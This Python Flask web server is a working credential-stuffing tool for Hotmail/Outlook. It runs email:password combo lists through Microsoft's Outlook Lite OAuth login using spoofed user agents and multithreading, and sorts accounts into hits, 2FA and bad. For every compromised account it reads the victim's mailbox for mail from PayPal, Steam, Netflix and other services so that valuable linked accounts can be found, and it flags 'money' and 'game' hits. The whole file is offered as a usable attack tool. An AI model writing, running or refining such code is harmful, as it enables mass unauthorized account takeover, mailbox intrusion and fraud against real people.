#!/usr/bin/env python3
"""
Multi-Checker Web Server – Hotmail/Outlook Account Checker
"""
import eventlet
eventlet.monkey_patch()

import os
import re
import uuid
import json
import random
import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from flask import Flask, render_template, request, send_file, jsonify
from flask_socketio import SocketIO, emit

# ------------------------------------------------------------
#                     CONFIGURATION
# ------------------------------------------------------------
app = Flask(__name__, static_folder='static', template_folder='templates')
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'change-me-to-something-random')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

MOBILE_UAS = [
    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
    "Dalvik/2.1.0 (Linux; U; Android 10; SM-G980F Build/QP1A.190711.020)",
    "Dalvik/2.1.0 (Linux; U; Android 11; Pixel 4 Build/RQ3A.210905.001)",
]
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# ------------------------------------------------------------
#                     SERVICE DEFINITIONS
# ------------------------------------------------------------
SERVICES = {
    "Facebook": {"sender": "security@facebookmail.com", "category": "social"},
    "Instagram": {"sender": "security@mail.instagram.com", "category": "social"},
    "TikTok": {"sender": "register@account.tiktok.com", "category": "social"},
    "Twitter": {"sender": "info@x.com", "category": "social"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "category": "social"},
    "Reddit": {"sender": "noreply@reddit.com", "category": "social"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "category": "social"},
    "WhatsApp": {"sender": "no-reply@whatsapp.com", "category": "social"},
    "Telegram": {"sender": "noreply@telegram.org", "category": "social"},
    "Discord": {"sender": "noreply@discord.com", "category": "social"},
    "Netflix": {"sender": "info@account.netflix.com", "category": "streaming"},
    "Spotify": {"sender": "no-reply@spotify.com", "category": "streaming"},
    "Twitch": {"sender": "no-reply@twitch.tv", "category": "streaming"},
    "YouTube": {"sender": "no-reply@youtube.com", "category": "streaming"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "category": "streaming"},
    "Hulu": {"sender": "account@hulu.com", "category": "streaming"},
    "Amazon": {"sender": "auto-confirm@amazon.com", "category": "shopping"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "category": "shopping"},
    "PayPal": {"sender": "service@paypal.com.br", "category": "finance"},
    "Steam": {"sender": "noreply@steampowered.com", "category": "gaming"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "category": "gaming"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com", "category": "gaming"},
    "Epic Games": {"sender": "help@acct.epicgames.com", "category": "gaming"},
    "Roblox": {"sender": "accounts@roblox.com", "category": "gaming"},
    "Minecraft": {"sender": "noreply@mojang.com", "category": "gaming"},
    "Garena": {"sender": "account@security.garena.com", "category": "gaming"},
    "Moonton": {"sender": "donotreply@service-sc.moonton.com", "category": "gaming"},
    "Coda": {"sender": "no-reply@codapayments.com", "category": "finance"},
}

# ------------------------------------------------------------
#                     CHECKER CLASS
# ------------------------------------------------------------
class OutlookChecker:
    def __init__(self, debug=False):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug

    def _search_emails(self, access_token, cid, query, size=20):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "Size": size,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json',
                'User-Agent': random.choice(BROWSER_UAS)
            }
            r = self.session.post(url, json=payload, headers=headers, timeout=15)
            if r.status_code == 200:
                return r.json()
            return None
        except:
            return None

    def check(self, email, password):
        """Returns a dict with status and optional data"""
        try:
            # Step 1: Get IDP
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": random.choice(MOBILE_UAS),
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive"
            }
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}

            time.sleep(0.2)

            # Step 2: Authorize
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": random.choice(BROWSER_UAS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\".*?value=\\"([^"]+)\\"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3: Login
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": random.choice(BROWSER_UAS),
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

            if "account or password is incorrect" in r3.text.lower():
                return {"status": "BAD"}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA", "email": email, "password": password}

            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            code = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            cid = mspcid.upper()

            # Step 4: Token exchange
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=15)
            access_token = r4.json().get("access_token")
            if not access_token:
                return {"status": "BAD"}

            # Get profile info
            country = ""
            name = ""
            try:
                r_prof = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                          headers={"Authorization": f"Bearer {access_token}",
                                                   "User-Agent": random.choice(BROWSER_UAS)},
                                          timeout=10)
                if r_prof.status_code == 200:
                    prof = r_prof.json()
                    country = prof.get("country", "") or ""
                    name = prof.get("displayName", "") or ""
            except:
                pass

            # Scan linked services (sender-based)
            services_found = []
            for service_name, info in SERVICES.items():
                data = self._search_emails(access_token, cid, f'from:"{info["sender"]}"', size=1)
                if data:
                    for es in data.get('EntitySets', []):
                        for rs in es.get('ResultSets', []):
                            if rs.get('Total', 0) > 0:
                                services_found.append({
                                    "name": service_name,
                                    "category": info["category"]
                                })
                                break
                # Avoid rate limits
                time.sleep(0.05)

            return {
                "status": "HIT",
                "email": email,
                "password": password,
                "country": country,
                "name": name,
                "services_found": services_found
            }

        except Exception as e:
            return {"status": "ERROR", "error": str(e)}

# ------------------------------------------------------------
#                     SOCKET EVENTS
# ------------------------------------------------------------
stop_event = threading.Event()

@socketio.on('start_scan')
def handle_start_scan(config):
    stop_event.clear()
    lines = config['lines']
    threads_count = max(1, min(config.get('threads', 5), len(lines)))

    total = len(lines)
    stats = {
        'checked': 0, 'hits': 0, 'bads': 0, 'two_fa': 0,
        'premium_hits': 0, 'game_hits': 0, 'money_hits': 0,
        'cpm': 0, 'current_email': '', 'start_time': time.time()
    }
    results = {'hits': [], 'twofas': []}

    def process_line(line):
        if stop_event.is_set():
            return
        try:
            # Support both email:pass and email:pass|capture
            if ':' in line:
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].split('|')[0].strip()
            else:
                return
        except:
            return

        stats['current_email'] = email
        checker = OutlookChecker()
        result = checker.check(email, password)

        with threading.Lock():
            stats['checked'] += 1
            elapsed = time.time() - stats['start_time']
            stats['cpm'] = int((stats['checked'] / elapsed) * 60) if elapsed > 0 else 0

            if result['status'] == 'HIT':
                stats['hits'] += 1
                if result.get('services_found'):
                    stats['premium_hits'] += 1
                    # Rough categorisation
                    cats = [s['category'] for s in result['services_found']]
                    if 'gaming' in cats:
                        stats['game_hits'] += 1
                    if 'finance' in cats:
                        stats['money_hits'] += 1
                results['hits'].append(result)
                socketio.emit('result_line', {
                    'type': 'hit',
                    'message': f"HIT: {email}:{password}",
                    'entry': {'email': email, 'password': password}
                })
                if result.get('services_found'):
                    svc_names = [s['name'] for s in result['services_found']]
                    socketio.emit('result_line', {
                        'type': 'premium',
                        'message': f"  ↳ {', '.join(svc_names)}"
                    })
            elif result['status'] == '2FA':
                stats['two_fa'] += 1
                results['twofas'].append({'email': email, 'password': password})
                socketio.emit('result_line', {
                    'type': '2fa',
                    'message': f"2FA: {email}:{password}",
                    'entry': {'email': email, 'password': password}
                })
            else:
                stats['bads'] += 1
                if stats['checked'] % 20 == 0:
                    socketio.emit('result_line', {
                        'type': 'bad',
                        'message': f"BAD: {email}"
                    })

            socketio.emit('stats_update', stats)

    # Run in thread pool
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        futures = [executor.submit(process_line, line) for line in lines]
        for f in as_completed(futures):
            if stop_event.is_set():
                break

    socketio.emit('scan_complete', {
        'hits': stats['hits'],
        'two_fa': stats['two_fa'],
        'bads': stats['bads'],
        'results': results
    })

@socketio.on('check_single')
def handle_check_single(config):
    email = config['email']
    password = config['password']
    checker = OutlookChecker()
    result = checker.check(email, password)
    socketio.emit('single_result', result)

@socketio.on('stop_scan')
def handle_stop():
    stop_event.set()
    socketio.emit('result_line', {'type': 'info', 'message': '⏹️ Scan stopped'})

# ------------------------------------------------------------
#                     ROUTES
# ------------------------------------------------------------
@app.route('/')
def index():
    return render_template('index.html')

# ------------------------------------------------------------
#                     MAIN
# ------------------------------------------------------------
if __name__ == '__main__':
    os.makedirs('downloads', exist_ok=True)
    port = int(os.environ.get('PORT', 5000))
    # Production-ready start – NO 'server=' argument
    socketio.run(app, host='0.0.0.0', port=port)
